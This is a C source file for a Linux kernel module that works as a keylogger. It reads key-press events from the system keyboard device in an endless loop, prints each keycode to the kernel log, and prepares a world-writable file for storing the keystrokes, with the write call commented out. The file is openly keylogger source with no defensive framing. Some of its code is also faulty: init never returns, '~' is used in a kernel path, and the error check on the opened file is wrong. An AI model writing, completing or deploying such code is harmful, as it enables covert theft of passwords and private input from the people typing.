#include <linux/init.h>
#include <linux/input.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");

static int __init keylogger_init(void) {
    loff_t pos;
    char buf[20];
    mm_segment_t old_fs = get_fs();
    struct input_event ev;
    struct file *keyboard = filp_open("/dev/input/by-path/platform-i8042-serio-0-event-kbd", O_RDONLY, 0);
    char *persist_f = "~/Documents/your_strokes.txt";
    struct file *persist = filp_open(persist_f, O_RDWR | O_CREAT | O_APPEND, 0777);
    if (!persist) {
        printk(KERN_INFO "bad\n");
        return -1;
    }
    
    pos = 0;
    set_fs(KERNEL_DS);
    while (1) {
        kernel_read(keyboard, &ev, sizeof(struct input_event), &pos);
        if (ev.value == 1) {
            printk(KERN_INFO "%d, %d\n", ev.code, ev.value);
            scnprintf(buf, 20, "%d\n", ev.code);
            //kernel_write(persist, buf, 3, &pos);
        }
    }
    set_fs(old_fs);
    return 0;
    
}

module_init(keylogger_init);